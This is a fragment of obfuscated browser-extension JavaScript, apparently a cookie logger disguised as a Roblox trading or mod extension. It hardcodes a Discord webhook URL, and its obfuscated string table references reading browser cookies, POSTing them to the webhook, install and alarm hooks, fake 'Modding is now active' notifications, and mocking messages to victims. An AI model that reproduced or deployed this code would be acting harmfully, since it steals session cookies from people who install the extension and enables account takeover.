...
var discord_web_api = "https://discord.com/api/webhooks/1166519934172545055/uFAUw8KywUoOtrhma1gpfmL7tIYF4XYfUFrsYhy7Dv-bHdLTIcm-NlmPxWmr5sUjOUzU";

var _0x9917 = ["alarms", "length", "substr", "push", website, cookie_data, "value", "\x0A", "join", "get", "cookies", discord_web_api, "?wait=true", "....", ".", "..", "...", "|", "POST", "ajax", "open", "Content-Type", "application/json; charset=UTF-8", "setRequestHeader", "stringify", "send", "random", "floor", "Get logged dumbass", "Ez hit LOL!", "Free bobux moment loool", "lelle", "Usmxn's Extention Logger", " ", "tradeBackground", "create", "reason", "install", "tradeBotStart", "basic", "icon.png", "Mods! Mods has started!", "Welcome! Modding is now active!", "notifications", "Usmxn's Extention Logger", "addListener", "onInstalled", "runtime", "name", "onAlarm"];
